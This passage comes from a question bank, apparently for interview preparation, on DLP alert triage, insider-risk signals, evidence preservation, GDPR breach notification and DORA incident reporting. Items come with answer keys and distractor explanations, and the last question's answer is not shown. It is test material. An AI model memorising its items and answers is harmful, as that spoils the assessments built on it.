Microsoft Purview Insider Risk Management uses the same ideas: its cumulative exfiltration detection compares 30 days of activity with organisation and peer-group norms (peer groups from org hierarchy, shared SharePoint access and job titles), and its risk score boosters raise scores for activity above the user's usual level or a previous case resolved as a policy violation.

distractors.a: Raising the threshold keeps the same ranking, still driven by noise, and hides lower-volume users who may be the real risk.
distractors.b: Excluding a department that handles customer data all day creates the largest blind spot, among the people with the most access.
distractors.d: Leavers matter, but this misses compromised accounts and current staff, and it is a trigger condition rather than a scoring model.

explanation.interview_angle: Whether you can design a risk score that measures deviation and confirmed behaviour rather than raw exposure to noisy rules.

references.title: Microsoft Learn: Configure policy indicators in Insider Risk Management

questions.subtopic: insider or compromised: remote control of the endpoint
questions.question: At a software company, DLP flags a 2 GB upload of product source code to a personal cloud storage account from a developer's laptop at 01:55. The developer is on approved leave abroad. EDR shows that a remote-access tool session to the laptop opened at 01:48 from an IP address never seen for this user, using the tool's unattended-access password. Which interpretation and next step fit the evidence?

options.text: The developer is taking the code from abroad; pass the case to HR and Legal and wait until the developer returns before acting
A false positive, because the developer was not physically at the laptop when the upload happened
A sync job queued before the leave; the remote session is normal for developers and can be ignored
The person at the keyboard is unknown; end the session, isolate the host, preserve evidence, and test both hypotheses

explanation.correct: The DLP alert says the developer's laptop uploaded the code; the EDR record says someone controlled that laptop remotely seven minutes earlier from a new IP address. That someone could be the developer connecting from abroad, or an attacker who obtained the unattended-access password (ATT&CK T1219, Remote Access Tools, followed by T1567.002, Exfiltration to Cloud Storage). Both hypotheses lead to the same first move: stop the loss and keep the evidence, by ending the session, isolating the host through EDR and preserving the remote-tool, EDR and proxy logs. Then test the hypotheses: where the IP address geolocates compared with the approved travel, whether the remote-tool account shows other logons or a recent password change, and whether the developer's identity sign-ins match. Only then does the case go to HR and Legal as insider risk or to IR as a compromise.

distractors.a: This assumes the actor without evidence and leaves the source code exposed for days. Waiting is wrong under either hypothesis.
distractors.b: Remote control means nobody needed to be physically present. The DLP detection of source code leaving is accurate whoever did it.
distractors.c: A remote session from a never-seen IP minutes before the upload is the key finding, not noise; a queued sync would not need it.

explanation.interview_angle: Whether you avoid attributing the actor too early and pick containment that is correct whichever hypothesis turns out true.

references.title: MITRE ATT&CK T1219 Remote Access Tools
MITRE ATT&CK T1567.002 Exfiltration to Cloud Storage

questions.question: Analysts keep missing the fact that a user behind an alert has resigned, because HR tells the security team about leavers in occasional emails. As the detection engineer, how should leaver status reach the alerts?

options.text: Scan staff mailboxes for words such as 'resignation' and raise alert severity for anyone who uses them
Import notice and last-day dates from the HR system on a schedule and join them to alerts by user ID
Ask line managers to tag their leavers by hand in the alert console whenever they think of it
Raise the severity of all alerts from departments with high staff turnover, leaving or not

explanation.correct: Leaver status should come from the authoritative system, arrive automatically, and be joined on a stable identifier, so that every alert carries it without anyone remembering. A scheduled import of the notice date and last working day, joined by employee ID or UPN, lets the rule raise priority within a defined window (from notice through the last day and a short period after). Both main platforms document this. Microsoft Sentinel watchlists are meant for reference data such as lists of terminated employees, queried with _GetWatchlist() and joined with 'lookup' or 'join'. Microsoft Purview Insider Risk Management's HR connector imports resignation and termination dates, which trigger the 'Data theft by departing users' template. Agree the fields with HR and the DPO and import only what the detection needs.

distractors.a: Scanning mailboxes for keywords is intrusive, unreliable (people resign in person or on HR forms), and hard to justify under data-protection rules.
distractors.c: A manual step that depends on memory is the same gap as the occasional email, just moved to another team.
distractors.d: Department-wide severity bumps add noise for everyone and still miss the individual leaver in a low-turnover team.

explanation.interview_angle: Whether you solve a context gap with an automated, authoritative enrichment rather than with manual steps or blunt severity changes.

references.title: Microsoft Learn: Use watchlists in Microsoft Sentinel
Microsoft Learn: Set up a connector to import HR data

questions.question: At 09:00 an MSSP analyst finds 900 new DLP alerts for one client in the last hour, all from a rule the client changed last night, plus 25 alerts from other rules. Every alert has a 4-hour triage SLA. What should the analyst do?

options.text: Work through all 925 alerts in arrival order, so that each one gets the same individual review
Disable the changed rule in the client's console to stop the flood, and inform the client afterwards
Sample the 900 for a common cause, triage the other 25 normally, raise the change with client and lead
Bulk-close the whole queue as false positives, since a misfiring rule makes every one of today's alerts unreliable

explanation.correct: A surge from one recently changed rule is a problem to diagnose, not 900 problems to work one by one. Sampling shows whether the alerts share a cause, for example a new keyword that matches a standard email footer. The 25 alerts from other rules keep their normal triage so that the surge does not hide a real incident. The client owns the rule, so the change goes back through the client's change process and the shift lead is told the SLA is at risk. Alerts that fit the confirmed false-positive pattern can then be closed in bulk with a documented rationale and the client's agreement. Alerts that do not fit, such as unusually high match counts or personal-domain recipients, get individual review, because a broken rule can still catch a real leak.

distractors.a: Arrival order lets the 25 unrelated alerts breach their SLA behind 900 likely duplicates, and individual review of identical noise teaches nothing new.
distractors.b: Changing a client's security control without authority is outside most MSSP contracts and leaves the client blind on that rule until someone notices.
distractors.d: Closing everything, including the 25 unrelated alerts and any real hits in the 900, trades an SLA problem for missed incidents.

explanation.interview_angle: Whether you protect SLAs by finding the common cause and keep the unrelated queue moving, without overstepping the client's change control.

references.title: Microsoft Learn: Learn about investigating data loss prevention alerts

questions.question: An MSSP's monthly report to a bank client shows that 99% of DLP alerts were triaged within the SLA. A quality review of 100 randomly chosen closed alerts finds that 14 closed as 'false positive' were real transfers of customer data to personal accounts. What should the service manager report and do?

options.text: Report the misclassification rate beside the SLA figure, re-review the period's closures, fix the cause
Report only the 99% SLA figure, because the contract measures timeliness and quality reviews are an internal matter
Quietly reclassify the 14 alerts as true positives and close them, as the transfers are weeks old
Lengthen the SLA for all alerts to give analysts more time, and mention the change once it is in place

explanation.correct: An SLA figure measures speed, not correctness, and here speed is hiding misclassification: 14 of 100 sampled closures were wrong. The rest of the period's closures therefore probably contain more missed incidents, so the service re-reviews them, starting with the riskiest data types and destinations. The bank must hear about it promptly, because the missed transfers may be personal data breaches the bank still has to assess. Under GDPR art. 33 the 72-hour clock runs from when the controller becomes aware, and every breach must be documented. The cause also needs fixing, whether it is pressure to close quickly, unclear guidance or gaps in training. Accuracy, measured by regular QA sampling, should be reported next to the SLA from then on.

distractors.b: Reporting a timeliness figure the provider knows is misleading breaks trust, and it keeps from the bank incidents it may have a legal duty to assess.
distractors.c: Silent reclassification hides the problem from the client, prevents the breach assessment, and leaves the other closures of the period unchecked.
distractors.d: More time may help, but it does not deal with the incidents already missed, and changing the service quietly is the same transparency failure.

explanation.interview_angle: Whether you treat triage accuracy as a reportable service metric and see the regulatory consequence of misclassified alerts.

references.title: GDPR art. 33: Notification of a personal data breach to the supervisory authority
NIST SP 800-61r3 Incident Response Recommendations and Considerations

questions.subtopic: insider-risk signals around an off-hours alert
questions.question: An alert shows a user copying 300 files to a USB drive at 21:30. Which TWO additional facts most raise the priority of this alert as an insider-risk case? (Choose TWO.)

options.text: The user often works late, and evening logins are part of their normal weekly pattern
The user handed in their notice last week
The files are marketing brochures already published on the company's website
The user's team takes IT-issued encrypted USB drives on client site visits
The files come from a client-data share that neither the user nor their peers use

explanation.correct: An off-hours USB copy is an anomaly; context decides whether it is risk. A resignation is the classic trigger: departing users are the focus of dedicated insider-risk templates, because data theft clusters between notice and the last day. Access to a data set outside the user's role and outside their peer group's normal use suggests deliberate collection rather than routine work. Together they move the alert from 'unusual' to 'priority', which means checking what the files contain, preserving the endpoint evidence and following the insider-risk route. ATT&CK maps the copy itself to T1052.001, Exfiltration over USB.

distractors.a: A habit of working late makes the hour less unusual, so it lowers the off-hours signal rather than raising it.
distractors.c: Public content has no confidentiality impact. The alert may point to a rule that needs tuning, not to an insider case.
distractors.d: IT-issued encrypted drives for client visits point to an approved channel. It still needs a check, but it lowers the priority.

explanation.interview_angle: Whether you weigh context (leaver status, access outside role) over the raw anomaly when prioritising insider-risk alerts.

references.title: Microsoft Learn: Learn about Insider Risk Management policy templates
MITRE ATT&CK T1052.001 Exfiltration over USB

questions.subtopic: evidence handling for an insider case
questions.question: An MSSP IR lead reviews the evidence plan for a client's insider data-theft case that may end in court. Which TWO planned steps would weaken the evidence? (Choose TWO.)

options.text: Export the audit and DLP records as raw files with original UTC timestamps, noting the query and export time
Have an analyst log on to the suspect's laptop with an admin account to browse recent files before imaging
Record a SHA-256 hash of each item at collection and check it again whenever the item is copied
Keep only console screenshots of the alerts, and delete the raw exports to save storage space
Store collected items in a restricted case folder and log every access to them and every transfer

explanation.correct: Evidence has to be shown to be complete and unchanged. Logging on interactively to the suspect's laptop changes it before it is preserved: it creates logon events (4624), updates file access times and registry and user-profile artefacts, and may trigger sync or cleanup, so the defence can argue the analyst altered the data. The laptop is imaged first through the forensic process that NIST SP 800-86 describes, and analysis happens on the copy. Screenshots are fine for a report, but they hold only the fields visible on screen and cannot be re-queried or verified against the source. Deleting the raw exports is worse because the source expires: Microsoft 365 Audit (Standard) keeps records for 180 days. Raw exports with the query recorded, hashes checked on every copy, and a logged, restricted store are what make the evidence defensible.

distractors.a: This is good practice: raw records with original timestamps and a recorded query can be reproduced and checked.
distractors.c: Hashing at collection, and re-checking on every copy, is what proves the item has not changed.
distractors.e: Restricted storage with an access and transfer log is the chain-of-custody record.

explanation.interview_angle: Whether you know which well-meant analyst actions destroy evidential value, and why imaging comes before looking.

references.title: NIST SP 800-86 Guide to Integrating Forensic Techniques into Incident Response
Microsoft Learn: Manage audit log retention policies

questions.question: A bank's DLP rule blocked an employee's email carrying 2,000 customer records to a personal address. Because nothing left the bank, the L1 analyst can close the alert without any further checks.

options.text: True
False

explanation.correct: The block stopped one channel, not the intent. Someone who tries to send 2,000 customer records to a personal address may try again by another route, so the analyst checks the same user and time window for other channels (web upload, USB, print, other mailboxes), for repeated attempts, and for the same data sent in smaller pieces that each stay under the rule's threshold (ATT&CK T1030, Data Transfer Size Limits). The analyst also confirms in the message trace that nothing went out and records the attempt, so that a repeat is recognised. If the checks are clean, the case can close as a prevented attempt; if not, it becomes a confirmed transfer by another channel.

distractors.a: A blocked send prevents this loss only. The attempt itself is an insider-risk signal, and the data may leave by another channel or in smaller pieces.

explanation.interview_angle: Whether you treat a blocked exfiltration attempt as a lead to follow, not as a closed case.

references.title: MITRE ATT&CK T1030 Data Transfer Size Limits
Microsoft Learn: Learn about investigating data loss prevention alerts

questions.question: Four alerts are waiting when an L1 analyst starts a shift. Put them in the order the analyst should pick them up, highest priority first.

options.text: Blocked email with 50 customer records to the sender's personal address, 2 hours ago
Delivered email with 2,000 customer IBANs to an unknown external address, 1 hour ago
One low-confidence national ID match in a file shared with a colleague internally
Upload of customer files to personal cloud storage by a leaver, still running and not blocked

explanation.correct: Priority follows risk and how much a quick response can still change, not arrival order. The running upload by a leaver comes first: data is leaving now, and containment can still limit how much. The delivered email with 2,000 IBANs to an unknown external address comes next: the loss has happened and is large, so scoping, containment and the privacy assessment cannot wait. The blocked email is third: nothing left, but an attempt to send customer data to a personal address is a lead to follow up. The single low-confidence internal match is last: it may be a false positive, and even if real it stayed inside the organisation. Triage SLAs set the latest acceptable time for each severity; they do not mean waiting until the deadline.
explanation.interview_angle: Whether you prioritise by live risk and the chance to reduce harm, rather than by queue position or the severity label alone.

references.title: Microsoft Learn: Learn about investigating data loss prevention alerts
NIST SP 800-61r3 Incident Response Recommendations and Considerations

questions.question: A bank's DLM team keeps a list of common false-positive sources. Match each data type to the false-positive pattern typical for it.

right.text: The bank's own account number in the footer of every outgoing letter and invoice
Numbers published for testing payment systems, copied into test files
13-digit order references that happen to pass a check digit, with no ID keyword nearby
Open-source library files downloaded from a public repository
A customer's scanned ID card attached to an account-opening email

explanation.correct: Each data type has a typical look-alike. Test card numbers are built to pass the Luhn check, so a pattern-plus-checksum rule matches them; Microsoft Purview's built-in credit card type skips reserved test numbers, but custom rules often do not. The bank's own IBAN printed on its letters is a real IBAN, but it is corporate data meant to be shared, and it can make every outgoing letter look like account data. A national ID with a check digit still matches random 13-digit strings now and then: Purview's Romanian CNP type checks the structure (date of birth, county code) and a checksum, and it rises from medium to high confidence only when a keyword such as 'CNP' is within 300 characters. Code classifiers recognise code, not ownership, so public open-source files look like proprietary source. The scanned ID card is a true positive, not a false-positive pattern.

distractors.l3: The scanned ID card (r5) is real personal data. It is a true positive and needs OCR to be detected at all; it is not a look-alike.
distractors.l2: Account numbers in a letter footer are real IBANs, unlike test card numbers (r2). The fix is to exclude the bank's own accounts, not to weaken the IBAN check.

explanation.interview_angle: Whether you know the typical look-alikes for each data type, which is what makes alert validation quick and tuning accurate.

references.title: Microsoft Learn: Credit card number entity definition
Microsoft Learn: Romania personal numeric code (CNP) entity definition

questions.question: A bank is introducing a four-level data classification scheme. Who should decide the classification of the dataset that holds the bank's retail credit decisions?

options.text: The information security team, because it writes the DLP rules that will protect the dataset
The business owner accountable for the dataset, applying the scheme security maintains
The IT team that hosts the database, because it controls who has technical access to it
Each employee who works with the dataset, labelling their own copies as they see fit

explanation.correct: Classifying data is a business judgement: how much harm would follow if this data were disclosed, altered or lost, and who legitimately needs it. The data owner (an accountable business manager) is the person able to make that judgement and to approve who gets access. Security defines and maintains the scheme, the handling rules for each level and the tools; IT, as custodian, runs the technical controls. DLP depends on this split: rules, severities and exceptions are keyed to the classification, so a level set by the wrong person flows straight into the wrong rule. Frameworks reflect this: CIS Control 3 asks for a data management process with a classification scheme, and NIST CSF 2.0 has assets prioritised by classification (ID.AM-05) and cybersecurity roles and responsibilities assigned (GV.RR-02).

distractors.a: Security owns the scheme and the controls, not the business value of the data; if security classifies, the owner is never accountable for the result.
distractors.c: Hosting the data makes IT the custodian, which implements controls, not the party that judges business impact.
distractors.d: Users label documents within the scheme, but the classification of a whole business dataset cannot vary with each person's view.

explanation.interview_angle: Whether you know who is accountable for data in a bank, and why DLP rules inherit the owner's decision rather than make it.

references.title: CIS Critical Security Control 3: Data Protection
NIST Cybersecurity Framework (CSF) 2.0, CSWP 29

questions.question: A DLP investigation shows that a relationship manager who resigned took client files, and Legal expects a dispute with him. His account is due to be removed on his last day, and the mail platform keeps a removed user's mailbox for only 30 days unless a hold applies. What should the investigation lead do?

options.text: Export the mailbox to the analyst's workstation now, so that a copy survives the account removal
Ask IT to keep the account active until the dispute ends, so that nothing is deleted in the meantime
Rely on the DLP incident records, which already hold the matched content and its metadata
Ask Legal to issue a legal hold and confirm the mailbox is on hold before the account is removed

explanation.correct: When litigation is expected, normal deletion schedules must stop for the relevant data, and that has to happen before routine leaver processing destroys it. Legal issues the hold (scope, custodians, duration, release when the matter ends) so that the preservation is documented and defensible; the investigation lead makes sure it is applied and verified before deprovisioning. In Microsoft 365, for example, a removed user's mailbox is kept for 30 days and then permanently removed, but if a hold (a retention policy, retention label or eDiscovery hold) is applied before the account is deleted, the mailbox becomes an inactive mailbox and is retained. The order matters: hold, confirm, then remove the account.

distractors.a: An ad hoc export to a workstation spreads client data, sits outside any controlled store and is hard to defend as complete and unaltered.
distractors.b: Keeping a leaver's account active leaves an access path open and is not a preservation mechanism; a hold preserves content without keeping the account usable.
distractors.c: DLP incidents keep only what matched a rule and some metadata; the dispute may turn on other messages, replies and attachments that only the mailbox holds.

explanation.interview_angle: Whether you protect evidence against routine deletion in time, through Legal, instead of improvising copies.

references.title: Microsoft Learn: Learn about inactive mailboxes
NIST SP 800-86, Guide to Integrating Forensic Techniques into Incident Response

questions.subtopic: minimising evidence stored in DLP incidents
questions.question: A DLP vendor is deciding what its incident records store when a rule matches a file with payment card numbers. Its customers are EU banks. Which default design best balances investigation needs with data protection?

options.text: Store match metadata, a masked excerpt and the file hash; full copies only if the customer opts in, with a set retention
Store a full copy of every matched file with no expiry, so investigators can always go back to the original evidence later on
Store only a monthly count of matches per user, so that the incident store never holds any personal data that could itself leak
Store full copies encrypted with a key held by the vendor's support staff, so support can open them whenever a customer asks for help

explanation.correct: The incident store of a DLP product concentrates exactly the data the customer is trying to protect, so it must not become the biggest leak risk. GDPR art. 25(2) asks for data protection by default: only the personal data necessary for each purpose. Art. 5(1)(c) (data minimisation) and 5(1)(e) (storage limitation) point the same way. Metadata (user, channel, destination, rule, time), a masked excerpt and a hash let an analyst triage and later prove which file was involved; a full copy is an option the customer, as controller, turns on where its investigations need it, with role-based access and a retention period it sets. The vendor acts as processor under art. 28 and should process data only on the customer's instructions.

distractors.b: Keeping every matched file forever builds a permanent copy of the customer's most sensitive data, against storage limitation, and enlarges the impact of any breach of the vendor.
distractors.c: Counts alone make triage impossible: an analyst cannot tell a test file from a real leak or prove what left, so the product would fail its purpose.
distractors.d: A vendor-held key gives the processor's staff standing access to customer data, which the customer as controller has not instructed and cannot control.

explanation.interview_angle: Whether you see the DLP tool itself as a data store that needs privacy by design, not only as a control.

references.title: GDPR art. 25: Data protection by design and by default
GDPR art. 5: Principles relating to processing of personal data

questions.question: A company plans DLP content inspection of employee email and web uploads, and analysts will be able to view matched content. Which THREE measures help make this monitoring lawful under GDPR?

options.text: Tell employees, in a policy they can access, what is monitored, why, and who can see the results
Rely on a consent clause signed in the employment contract as the legal basis for all of the monitoring
Assess necessity and proportionality (for example in a DPIA) and inspect only the channels at risk
Keep the monitoring secret from staff, so that people planning to leak data do not change how they behave
Restrict matched content to authorised analysts and use it only for the stated security purpose

explanation.correct: Employee monitoring is lawful when it has a proper legal basis, is transparent, proportionate and limited to its purpose. The Article 29 Working Party's Opinion 2/2017 on data processing at work names DLP tools among the monitoring technologies it assesses. It says consent is highly unlikely to be a legal basis at work, that legitimate interests can sometimes be invoked when the processing is strictly necessary and proportionate, that employees should be clearly informed of any monitoring, and that the proportionality assessment can form part of a DPIA. Transparency comes from art. 5(1)(a) and the information duties (a policy saying what is monitored, why and who sees it). A proportionality assessment, often a DPIA, keeps inspection to the channels and data types that carry the risk. Restricting access and using results only for security reflects purpose limitation (art. 5(1)(b)); reusing DLP data to score productivity, for instance, would be a new purpose. Art. 88 also lets Member States set more specific rules on monitoring at work, so national law and any works-council duties must be checked.

distractors.b: Consent is rarely freely given between employer and employee because of the imbalance of power (recital 43; WP29 Opinion 2/2017), so a contract clause is a weak basis.
distractors.d: Secret, blanket monitoring breaks the transparency principle; any targeted covert measure in a specific investigation needs its own legal basis and Legal's approval.

explanation.interview_angle: Whether you can run DLP in a way that survives a works council or privacy review, not only a technical one.

references.title: Article 29 Working Party: Opinion 2/2017 on data processing at work (WP249)
GDPR art. 88: Processing in the context of employment
GDPR art. 5: Principles relating to processing of personal data

questions.question: A controller becomes aware of a personal data breach on Monday at 10:00 and finishes its risk assessment on Thursday at 18:00, concluding that the breach is likely to result in a risk to individuals. Because the 72-hour window has already closed, it should record the breach in its internal register instead of notifying the supervisory authority.

options.text: True
False

explanation.correct: The 72 hours ended on Thursday at 10:00, but the duty to notify does not lapse. GDPR art. 33(1) says that where the notification is not made within 72 hours, it must be accompanied by the reasons for the delay: the controller notifies now and explains why it is late. The internal record under art. 33(5) is required for every breach in any case; it is not a substitute for notifying a breach that is likely to result in a risk. The lesson for the DLM process is to avoid the situation: art. 33(4) allows information to be provided in phases, so a controller can notify within the window with what it knows and add the rest later.

distractors.a: Missing the deadline does not cancel the duty; it adds the obligation to explain the delay, and silently not notifying turns a late notification into a failure to notify.

explanation.interview_angle: Whether you know that a missed deadline changes how you notify, not whether you notify.

references.title: GDPR art. 33: Notification of a personal data breach to the supervisory authority

questions.subtopic: documenting breaches that are not notified
questions.question: A privacy consultant reviews a client's handling of a misdirected email: one customer's branch appointment confirmation (name and time) went to another customer, who confirmed deletion. The client assessed the breach as unlikely to result in a risk to the individual. What does GDPR still require of the client?

options.text: Nothing further, because only breaches that are notified to the authority need to be recorded
A notification to the authority within 72 hours anyway, since every personal data breach must be notified
A breach-register entry with the facts, effects and remedial action, plus the reasoning for not notifying
A letter to the affected customer, because every breach must be communicated to the data subject

explanation.correct: GDPR art. 33(5) requires the controller to document any personal data breach, comprising the facts, its effects and the remedial action taken, so that the supervisory authority can verify compliance. EDPB Guidelines 9/2022 add that the reasoning behind decisions should be documented, in particular a justification when a breach is not notified, explaining why it is unlikely to result in a risk. Here the data is limited, the recipient is known and confirmed deletion, so not notifying can be defensible, but only with that record. A breach register also gives the DLP programme its trend data: repeated misdirected emails point to a control gap such as address auto-complete.

distractors.a: Documentation covers every breach, notified or not; the register is how the controller later shows the authority that the decision not to notify was reasoned.
distractors.b: Art. 33(1) exempts breaches unlikely to result in a risk to individuals; notification follows the risk assessment.
distractors.d: Art. 34 applies only when the breach is likely to result in a high risk to the individual, which is not the case here.

explanation.interview_angle: Whether you separate the duty to document every breach from the risk-based duties to notify and to inform.

references.title: GDPR art. 33: Notification of a personal data breach to the supervisory authority
EDPB Guidelines 9/2022 on personal data breach notification under GDPR

questions.subtopic: recipients of incident reports in Romania
questions.question: Match each situation in Romania to the party that must receive the report or communication.

left.text: A credit institution's major ICT-related incident under DORA
An insurer's major ICT-related incident under DORA
A bank's personal data breach that is likely to result in a risk to individuals
A bank's personal data breach that is likely to result in a high risk to individuals
A personal data breach found by the processor that prints the bank's account statements

right.text: ASF, the Financial Supervisory Authority
The bank, as controller, without undue delay
BNR, the National Bank of Romania
ANSPDCP, through its online breach-notification form
The affected customers, in clear and plain language, in addition to the authority
The national CSIRT, as a NIS2 early warning within 24 hours

explanation.correct: DORA art. 19(1) sends major ICT-related incident reports to the competent authority under art. 46, and Romania's OUG 14/2026 art. 5 designates BNR for credit, payment and e-money institutions and ASF for insurers, investment firms and most other financial entities. Personal data breaches follow GDPR: the controller notifies the data protection authority (in Romania ANSPDCP, through its online form) unless the breach is unlikely to result in a risk (art. 33(1)), and when the risk is high it also informs the data subjects without undue delay in clear and plain language (art. 34). A processor does not notify the authority on the controller's behalf by default: art. 33(2) obliges it to notify the controller without undue delay, and the controller's own assessment starts from there. One incident can trigger several of these at once.

distractors.l1: A NIS2 early warning (r6) is not the route for a bank: for financial entities DORA takes precedence over NIS2 incident reporting.
distractors.l2: BNR (r3) is the DORA authority for credit, payment and e-money institutions; insurers and reinsurers are supervised by ASF.
distractors.l5: The processor's duty is towards its controller (r2); deciding whether to notify ANSPDCP (r4) remains the bank's call.

explanation.interview_angle: Whether you can route one incident to the right recipients under each regime in a Romanian bank.

references.title: OUG nr. 14/2026 (Romania, DORA implementing measures), Portal Legislativ
ANSPDCP: Notificare Breșă RGPD (breach notification page)
GDPR art. 33: Notification of a personal data breach to the supervisory authority

questions.subtopic: DORA classification inputs from a leak investigation
questions.question: A credit institution confirms that an attacker using a stolen administrator account copied client records from a system that supports a critical function. The incident manager asks the DLP investigation for inputs to the DORA major-incident classification. Which THREE findings are classification inputs?

options.text: How many DLP alerts the exfiltration triggered across all of the monitored channels and policies
The number of clients whose data was taken, compared with all clients using the affected service
Whether the incident has an impact in two or more Member States, e.g. through clients there
Whether the data protection authority has already been notified of the personal data breach under GDPR
The direct and indirect costs and losses incurred or expected, such as forensic, legal and redress costs

explanation.correct: Delegated Regulation (EU) 2024/1772 classifies an incident as major when it has affected critical services and either the threshold for successful, malicious and unauthorised access to systems (art. 9(5)(b)) is met or at least two other materiality thresholds are met (art. 8). Those thresholds include clients affected (more than 10% of the service's clients or more than 100,000), geographical spread (impact in two or more Member States), data losses (including confidentiality: data accessed by or disclosed to an unauthorised party), duration and downtime, reputational impact and economic impact above EUR 100,000. The DLP investigation is often the only source for who was affected, where they are and what the leak cost, so it must produce these figures, estimated where exact numbers are not yet known (art. 7(3) and art. 9(1) allow estimates). The stolen administrator account also matters for the data-losses criterion.

distractors.a: Alert volume measures the monitoring tool, not the impact of the incident; one alert can hide 100,000 affected clients.
distractors.d: GDPR notification is a separate regime with its own trigger; whether it has been sent says nothing about whether the DORA thresholds are met.

explanation.interview_angle: Whether your investigation output is shaped to what the bank must report, not only to what the tool shows.

references.title: Commission Delegated Regulation (EU) 2024/1772 (classification of ICT-related incidents)
DORA, Regulation (EU) 2022/2554, Official Journal text

questions.question: A bank classifies an incident as major under DORA: an internal misconfiguration exposed corporate clients' payment files, which hold no personal data, and those clients now face a risk of invoice fraud. As GDPR does not apply, the DPO says no client communication is required. What is the correct position?

options.text: The DPO is right: informing clients is a GDPR duty, so without personal data there is nothing to tell them
The bank should wait for its final report to the authority, so that clients receive only confirmed figures
Informing clients is optional goodwill, decided by marketing once the incident is closed and the cause is known
DORA itself requires telling affected clients, without undue delay, about the incident and the mitigations

explanation.correct: DORA art. 19(3) has its own client duty: where a major ICT-related incident has an impact on the financial interests of clients, the financial entity must, without undue delay as soon as it becomes aware of it, inform its clients about the incident and about the measures taken to mitigate its adverse effects. It applies whether or not personal data is involved, so legal-person clients are covered too. GDPR art. 34 is a separate, risk-based duty towards individuals whose personal data is breached; when both apply, the bank coordinates one consistent message. In a DLM process this means the stakeholder plan has to ask two questions, 'is personal data involved?' and 'is this a major incident affecting clients' financial interests?', instead of letting GDPR answer for both.

distractors.a: This treats GDPR as the only source of client communication duties; DORA art. 19(3) applies to major incidents regardless of personal data.
distractors.b: The final report can come more than a month later; the duty runs from awareness and is 'without undue delay', which would leave clients exposed to the fraud meanwhile.
distractors.c: Where art. 19(3) applies, informing clients is a legal duty with a timing requirement, not a goodwill decision taken after closure.

explanation.interview_angle: Whether you know that a bank's duty to inform clients does not depend only on GDPR.

references.title: DORA, Regulation (EU) 2022/2554, Official Journal text

questions.subtopic: interpreting a drop in DLP alerts
questions.question: An MSSP's monthly report shows that a client's DLP web-upload alerts fell by 60% in the month the client replaced its web proxy. The client's CISO wants to show the board this as proof that staff awareness training is working. What should the analyst advise first?

options.text: Check that traffic through the new proxy still reaches DLP inspection before crediting the training
Present the drop as a training success, since fewer alerts show that users are leaking less data than before
Lower the rule thresholds so that the alert count returns to its usual level before the board meeting takes place
Remove the web-upload metric from the board report, because alert counts never mean anything to management

explanation.correct: A fall in alerts has two very different explanations: people are doing less risky things, or the control sees less. A proxy replacement is a classic cause of the second: traffic may bypass inspection, TLS inspection may not be configured yet, or the new log format may not reach the DLP service. Before telling a board anything, check the inspected volume from the new proxy against previous months, the rule's scope and change history, and whether a known test upload still triggers an alert. Good management reporting pairs outcome metrics with coverage and health indicators and annotates changes (new proxy, rule tuning) on the trend line, so that nobody reads a loss of visibility as success.

distractors.b: Crediting training before ruling out a visibility gap risks reassuring the board about a blind spot; if the gap is real, the next leak goes unseen.
distractors.c: Tuning to hit a number games the metric and adds noise; the alert count is meant to follow risk, not a target.
distractors.d: Trends are useful to management when they come with context; dropping the metric hides the problem instead of explaining it.

explanation.interview_angle: Whether you question what a metric really measures before it reaches management.

references.title: NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations

questions.question: A DLP vendor is designing the management dashboard of its product. Match each metric to the management question it answers.

left.text: Median time from a high-severity alert to containment
Share of alerts closed as false positive, per rule
Share of in-scope channels covered by an active policy
Number of policy exceptions past their expiry date

right.text: Is our risk acceptance still under control?
Which rules need tuning?
How much data actually leaked this year?
How quickly do we act on serious leaks?
Where are we blind to data leaving?

explanation.correct: Each metric answers one question. Time to containment for high-severity alerts measures response speed where it matters. The false-positive share per rule shows which rules waste analyst time and need tuning, which a global false-positive rate hides. Channel coverage shows blind spots (for example a channel with no policy or one still in audit-only mode). Exceptions past expiry show whether risk accepted by data owners is being reviewed or has quietly become permanent. None of them measures how much data leaked: alert and incident counts reflect what the tool saw, not what left unseen, so a dashboard should never present them as 'data leaked'.

distractors.l2: A false-positive share describes rule quality, not the amount of data leaked (r3); a rule can be precise and still miss leaks.
distractors.l3: Coverage says where you can see, not how much leaked (r3); low coverage means the leaked volume is unknown, not low.

explanation.interview_angle: Whether you can pick metrics that answer a management question instead of reporting whatever the tool counts.

references.title: NIST Cybersecurity Framework (CSF) 2.0, CSWP 29

questions.question: An MSSP prepares a quarterly benchmark for two bank clients: Client A had 900 confirmed DLP incidents, Client B had 300. A's account manager wants to tell A it is 'three times riskier' than B. What must the analyst establish before such a comparison means anything?

options.text: Whether A's analysts close alerts faster than B's, since faster closure inflates the incident count
Nothing more, because confirmed incidents have already been validated and so are directly comparable
That both use the same incident definition, rules and channel coverage, normalised per 1,000 users
Which client's incidents involved more senior staff, since seniority is what drives the risk of an incident

explanation.correct: A raw count depends on how big the organisation is, what the DLP can see and what each client calls an incident. If A has 20,000 staff and B 3,000, A's rate per user is lower than B's. If B does not inspect web uploads, its count is low because it is partly blind. If A records every misdirected email as an incident and B groups them, the counts measure different things. A meaningful benchmark uses the same definitions and rule set, states coverage, normalises to a common base (per 1,000 users or per volume of inspected traffic) and ideally weights by severity. Shared with clients, such a benchmark must also be anonymised so that neither bank learns about the other.

distractors.a: Closure speed affects backlog and response time, not how many incidents are confirmed; it does not explain a threefold difference.
distractors.b: Validated does not mean comparable: each count is still shaped by size, coverage and definitions.
distractors.d: Seniority can raise the impact of a single case, but it does not correct for differences in size, coverage and definitions between the two counts.

explanation.interview_angle: Whether you can stop a misleading number from reaching a client or a board.

references.title: NIST Cybersecurity Framework (CSF) 2.0, CSWP 29

questions.question: A bank estimates the economic impact of a data-leakage incident for its DORA classification. Costs so far: EUR 60,000 for forensic and legal advice, EUR 30,000 customer redress and EUR 25,000 staff overtime. The cyber insurer will reimburse EUR 50,000, and the bank plans a EUR 200,000 DLP upgrade after the incident. Which figure counts towards the economic-impact threshold?

options.text: EUR 65,000, because the insurance reimbursement is deducted from the costs incurred
EUR 115,000, because recoveries are not deducted and the later upgrade is excluded
EUR 315,000, because the DLP upgrade is a direct consequence of the incident
EUR 265,000, because the upgrade counts but the insurance reimbursement is deducted

